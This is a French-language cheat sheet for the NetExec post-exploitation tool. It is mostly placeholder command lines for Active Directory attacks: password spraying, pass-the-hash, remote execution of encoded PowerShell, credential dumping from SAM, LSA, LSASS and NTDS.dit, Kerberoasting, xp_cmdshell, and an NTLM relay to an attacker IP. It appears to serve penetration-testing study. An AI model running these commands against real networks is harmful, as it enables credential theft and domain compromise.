**Objectif :** NetExec (anciennement CrackMapExec/CME) est un outil post-exploitation conçu pour évaluer la sécurité des grands réseaux Active Directory (et autres environnements). Il excelle dans l'énumération, la vérification d'identifiants (spraying), l'exécution de commandes et l'extraction de secrets sur de multiples hôtes simultanément via divers protocoles (SMB, LDAP, WinRM, [MSSQL](../Base%20de%20données/MSSQL.md), etc.).

  

**Source :** [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

  

**Syntaxe Générale :** `netexec <protocole> <cibles> [options_authentification] [options_action]`

  

**Cibles :** Peut être une IP unique, une plage [CIDR](../../../Misc/CIDR.md) (192.168.1.0/24), un nom d'hôte, ou un fichier contenant une liste de cibles (`-t targets.txt`).

  

**OPSEC :** NetExec peut être très "bruyant" sur le réseau. Les actions comme le password spraying, l'exécution de commandes, ou le dump de secrets (SAM, LSA, NTDS) sont généralement détectées par les EDR/SIEM. Utilisez avec prudence et adaptez les options (`--timeout`, `--threads`) à l'environnement.

  

---

  

### **Authentification**

  

NetExec supporte plusieurs méthodes pour s'authentifier auprès des cibles :

  

#### Mot de passe en clair

  

```bash

netexec <proto> <cible> -u <utilisateur | fichier_users> -p <mot_de_passe | fichier_pass> [-d <domaine>]

```

  

* **Usage :** Méthode la plus simple, mais expose les mots de passe. Utile pour tester un identifiant spécifique ou faire du password spraying.

* `-d <domaine>` : Spécifie le domaine (ex: `CONTOSO.local`). Nécessaire pour les comptes de domaine.

  

#### Hash NTLM (Pass-The-Hash)

  

```bash

netexec <proto> <cible> -u <utilisateur> -H <hash_ntlm | lm:ntlm> [-d <domaine>]

```

  

* **Usage :** Permet de s'authentifier en utilisant directement le hash NTLM de l'utilisateur, sans connaître le mot de passe en clair. Très courant en post-exploitation.

* `-H <hash>` : Fournir le hash NTLM complet, ou au format `LM:NTLM`.

  

#### Ticket Kerberos (Pass-The-Ticket)

  

```bash
export KRB5CCNAME=/chemin/vers/ticket.ccache
netexec <proto> <cible> -k [--use-kcache] [-d <domaine>]
```

  

* **Usage :** S'authentifie en utilisant un ticket [Kerberos](../../../Ressources/Windows/Kerberos.md) (TGT ou TGS) valide stocké dans un fichier cache (`.ccache`).

* `-k` : Active l'authentification [Kerberos](../../../Ressources/Windows/Kerberos.md).

* `--use-kcache` : Indique explicitement d'utiliser le fichier défini par `KRB5CCNAME`.

* **Prérequis :** Un ticket [Kerberos](../../../Ressources/Windows/Kerberos.md) valide pour un utilisateur du domaine cible.

  

#### Connexion Anonyme / Null Session (SMB/LDAP)

  

```bash
netexec smb <cible> -u '' -p ''
netexec ldap <cible> -u '' -p ''
```

  

* **Usage :** Tente de se connecter sans identifiants. Utile pour l'énumération initiale si les sessions null sont autorisées (rare sur les systèmes modernes et patchés).

  

#### Authentification Locale (SMB)

  

```bash
netexec smb <cible> -u <utilisateur> -p <mot_de_passe> --local-auth
```

  

* **Usage :** Force l'authentification en utilisant les comptes locaux de la machine cible plutôt que les comptes de domaine.

  

---

  

### 🗄️ **Protocole SMB** (Server Message Block)

  

*Utilisé pour le partage de fichiers, l'impression, et certaines interactions à distance sous Windows.*

  

#### Énumération de Base

  

```bash
# Vérifier l'accès (authentification)
netexec smb <cible> -u <user> -p <pass | -H hash> [-d domain]

# Lister les partages accessibles
netexec smb <cible> -u <user> -p <pass | -H hash> --shares

# Lister les sessions actives (qui est connecté ?)
netexec smb <cible> -u <user> -p <pass | -H hash> --sessions

# Lister les disques montés
netexec smb <cible> -u <user> -p <pass | -H hash> --disks

# Lister les utilisateurs connectés (loggedon)
netexec smb <cible> -u <user> -p <pass | -H hash> --loggedon-users

# Lister les utilisateurs et groupes locaux/domaine
netexec smb <cible> -u <user> -p <pass | -H hash> --users
netexec smb <cible> -u <user> -p <pass | -H hash> --groups

# Énumérer la politique de mot de passe du domaine
netexec smb <cible> [-u <user> -p <pass | -H hash>] --pass-pol
```

  

* **Contexte :** Ces commandes permettent d'obtenir une vue d'ensemble de la configuration SMB de la cible, des ressources partagées, et de l'activité utilisateur.

* **Usage :** Reconnaissance initiale, identification de partages intéressants, recherche de sessions d'utilisateurs privilégiés.

  

#### Modules d'Énumération et Vulnérabilités (`-M`)

  

```bash

# Vérifier si SMB Signing est désactivé (vulnérable au relais NTLM)
netexec smb <cible | subnet> --gen-relay-list smb_signing_off.txt

# Vérifier vulnérabilités spécifiques (exemples)
netexec smb <cible> [-u '' -p ''] -M ms17-010 # EternalBlue/WannaCry
netexec smb <cible> [-u '' -p ''] -M zerologon # Zerologon (CVE-2020-1472)
netexec smb <cible> [-u '' -p ''] -M petitpotam # PetitPotam (Relais NTLM)
netexec smb <cible> [-u '' -p ''] -M nopac # SAM Account Name Spoofing (CVE-2021-42278 & CVE-2021-42287)

# Vérifier si le service Spooler (Imprimante) est actif (vulnérable à PrintNightmare)
netexec smb <cible> [-u <user> -p <pass | -H hash>] -M spooler

# Énumérer les GPOs appliquées
netexec smb <cible> -u <user> -p <pass | -H hash> -M gpo

# Énumérer les ACLs intéressantes (qui a quels droits sur quoi)
netexec smb <cible> -u <user> -p <pass | -H hash> -M acl
```

  

* **Contexte :** Utilisation de modules spécifiques pour rechercher des vulnérabilités connues ou obtenir des informations plus détaillées.

* **Usage :** Identification rapide de failles exploitables ou de configurations dangereuses.

  

#### Exécution de Commandes (`-x`, `-X`, `-M`)

  

```bash
# Exécuter une commande simple via différentes méthodes (SMBExec, WMIExec, ATExec...)
netexec smb <cible> -u <user> -p <pass | -H hash> -x <commande>
  
# Exécuter une commande PowerShell plus complexe
netexec smb <cible> -u <user> -p <pass | -H hash> -X 'powershell -enc <base64_payload>'
```

  

* **Contexte :** Permet d'exécuter des commandes à distance sur les cibles où l'authentification réussit.

* **Usage :** Mouvement latéral, exécution de payloads, collecte d'informations supplémentaires.

* **Prérequis :** Droits d'administrateur local sur la machine cible.

* **OPSEC :** L'exécution de commandes est une action très surveillée.

  

#### Accès aux Fichiers et Partages

  

```bash

# Lister récursivement les fichiers/dossiers sur les partages accessibles
netexec smb <cible> -u <user> -p <pass | -H hash> --spider [nom_partage]
  
# Lister et potentiellement télécharger des fichiers intéressants (plus avancé)
netexec smb <cible> -u <user> -p <pass | -H hash> -M spider_plus [-o READ_ONLY=false DEPTH=2]
# -o READ_ONLY=false : Tente de télécharger les fichiers trouvés
# -o DEPTH=X : Profondeur de la recherche


# Télécharger un fichier spécifique
netexec smb <cible> -u <user> -p <pass | -H hash> --get-file '\\<PARTAGE>\<chemin>\fichier.txt' fichier_local.txt

# Uploader un fichier spécifique
netexec smb <cible> -u <user> -p <pass | -H hash> --put-file fichier_local.txt '\\<PARTAGE>\<chemin>\fichier.txt'
```

  

* **Contexte :** Interagir avec les partages de fichiers SMB.

* **Usage :** Recherche de fichiers sensibles, exfiltration de données, dépôt d'outils/payloads.

* **Prérequis :** Permissions de lecture/écriture appropriées sur les partages.

  

#### Dump d'Informations Sensibles

  

> \[!Attention]

> Ces actions sont très intrusives, bruyantes et nécessitent des privilèges élevés (Admin local ou Domain Admin).

  

```bash
# Dumper les hashes SAM locaux
netexec smb <cible> -u <user> -p <pass | -H hash> --sam

# Dumper les secrets LSA locaux (peut contenir clés, mots de passe de service...)
netexec smb <cible> -u <user> -p <pass | -H hash> --lsa

# Dumper la mémoire du processus LSASS (peut contenir mots de passe en clair, tickets...)
netexec smb <cible> -u <user> -p <pass | -H hash> -M lsassy

# Dumper la base de données NTDS.dit (hashes de tous les comptes du domaine)
netexec smb <DC_cible> -u <domain_admin> -p <pass | -H hash> --ntds [vss]
# [vss] : Utilise Volume Shadow Copy pour une copie plus stable (recommandé)
# Prérequis: Domain Admin sur un Contrôleur de Domaine.

# Dumper les clés DPAPI
netexec smb <cible> -u <user> -p <pass | -H hash> --dpapi

# Dumper les mots de passe Wifi stockés
netexec smb <cible> -u <user> -p <pass | -H hash> -M wireless

# Rechercher des fichiers Keepass et tenter d'extraire la masterkey
netexec smb <cible> -u <user> -p <pass | -H hash> -M keepass_discover

netexec smb <cible> -u <user> -p <pass | -H hash> -M keepass_trigger -o KEEPASS_CONFIG_PATH="<chemin_trouvé>"
```

  

* **Contexte :** Extraction directe d'identifiants et de secrets depuis les systèmes cibles.

* **Usage :** Objectif principal de nombreuses attaques pour obtenir des identifiants et élever les privilèges.

  

---

  

### 📔 **Protocole LDAP** (Lightweight Directory Access Protocol)

  

*Utilisé pour interroger et interagir avec l'annuaire Active Directory.*

  

#### Énumération LDAP

  

```bash
# Énumération de base (infos domaine, DC)
netexec ldap <DC_cible> [-u <user> -p <pass | -H hash>]

# Lister les utilisateurs (avec descriptions si disponibles)
netexec ldap <DC_cible> [-u <user> -p <pass | -H hash>] --users

netexec ldap <DC_cible> [-u <user> -p <pass | -H hash>] -M get-desc-users

# Lister les groupes
netexec ldap <DC_cible> [-u <user> -p <pass | -H hash>] --groups

# Lister les ordinateurs
netexec ldap <DC_cible> [-u <user> -p <pass | -H hash>] --computers

```

  

* **Contexte :** Interrogation de l'annuaire AD pour obtenir des informations sur les objets (utilisateurs, groupes, ordinateurs).

* **Usage :** Reconnaissance fondamentale en environnement AD. Peut souvent être fait avec un compte utilisateur standard.

  

#### Attaques Basées sur LDAP

  

```bash

# AS-REP Roasting (Recherche/Exploitation des comptes sans pré-authentification)
netexec ldap <DC_cible> [-u <user> -p <pass | -H hash>] --asreproast <fichier_hashes>
# Note: Peut parfois fonctionner en anonyme si on fournit une liste d'utilisateurs (-u users.txt -p '')

# Kerberoasting (Recherche/Exploitation des comptes avec SPN)
netexec ldap <DC_cible> -u <user> -p <pass | -H hash> --kerberoasting <fichier_hashes>

  

# Énumérer les comptes avec délégation non contrainte (Unconstrained Delegation)
netexec ldap <DC_cible> -u <user> -p <pass | -H hash> --trusted-to-auth

# Énumérer les ACLs intéressantes (peut révéler des chemins de PrivEsc)
netexec ldap <DC_cible> -u <user> -p <pass | -H hash> -M acl [-o USER="<user_cible>"]

# Énumérer le quota de création de comptes machine (ms-DS-MachineAccountQuota)
netexec ldap <DC_cible> [-u <user> -p <pass | -H hash>] -M maq
```

  

* **Contexte :** Utilisation de requêtes LDAP spécifiques pour identifier des configurations vulnérables ou extraire des informations permettant des attaques hors ligne (crack de hash).

* **Usage :** Recherche de vecteurs d'escalade de privilèges ou de compromission de comptes.

  

---

  

### 💻 **Protocole WINRM** (Windows Remote Management)

  

*Permet l'administration à distance via PowerShell Remoting.*

  

```bash
# Vérifier l'accès WinRM
netexec winrm <cible> -u <user> -p <pass | -H hash>

# Exécuter une commande via WinRM
netexec winrm <cible> -u <user> -p <pass | -H hash> -X <commande>
# Exemple: netexec winrm SRV01 -u admin -H <hash> -X 'Get-Process'

```

  

* **Contexte :** Alternative à SMB pour l'exécution de commandes à distance, utilise PowerShell.

* **Usage :** Mouvement latéral, exécution de scripts PowerShell.

* **Prérequis :** WinRM doit être activé et configuré sur la cible, et l'utilisateur doit avoir les droits appropriés (souvent admin local ou membre du groupe "Remote Management Users").

  

---

  

### 🗄️ **Protocole MSSQL** (Microsoft SQL Server)

  

*Interaction avec les bases de données SQL Server.*

  

```bash
# Vérifier l'accès MSSQL (Authentification SQL ou Windows)
netexec mssql <cible> -u <sql_user> -p <pass>

netexec mssql <cible> -u <win_user> -p <pass | -H hash> --local-auth # Auth Windows locale

netexec mssql <cible> -u <dom_user> -p <pass | -H hash> -d <domaine> # Auth Windows domaine

# Exécuter une requête SQL
netexec mssql <cible> -u <user> -p <pass> -q "SELECT @@version;"

# Tenter d'activer et utiliser xp_cmdshell pour exécuter des commandes système
netexec mssql <cible> -u <sa_user> -p <pass> -M xpcmdshell -o COMMAND="whoami"
# Prérequis: Privilèges élevés sur MSSQL (ex: sysadmin).

# Énumérer les privilèges de l'utilisateur connecté
netexec mssql <cible> -u <user> -p <pass> -M mssql_priv

# Tenter un relais NTLM via xp_dirtree (si l'utilisateur a les droits)
# (Lancez Responder/ntlmrelayx avant)
netexec mssql <cible> -u <user> -p <pass> -M ntlmrelay -o RHOST=<ip_attaquant>

```

  

* **Contexte :** Interaction directe avec les serveurs MSSQL.

* **Usage :** Énumération de bases de données, exécution de requêtes, potentielle exécution de commandes système ou relais NTLM si l'utilisateur a les privilèges suffisants (`sysadmin` pour `xp_cmdshell`, `public` peut suffire pour `xp_dirtree`).

  

---

  

### 🖥️ **Protocole RDP** (Remote Desktop Protocol)

  

```bash
# Vérifier si RDP est ouvert et si NLA est requis
netexec rdp <cible>

# Tenter une connexion (vérifier les identifiants)
netexec rdp <cible> -u <user> -p <pass | -H hash>

  

# Prendre un screenshot de la session RDP (si une session est active)
netexec rdp <cible> -u <user> -p <pass | -H hash> --screenshot screenshot.png [--screentime <secondes>]

```

  

* **Contexte :** Interaction avec le service RDP.

* **Usage :** Vérification d'accès, validation d'identifiants, capture d'écran (moins courant pour l'exploitation directe comparé à SMB/WINRM).
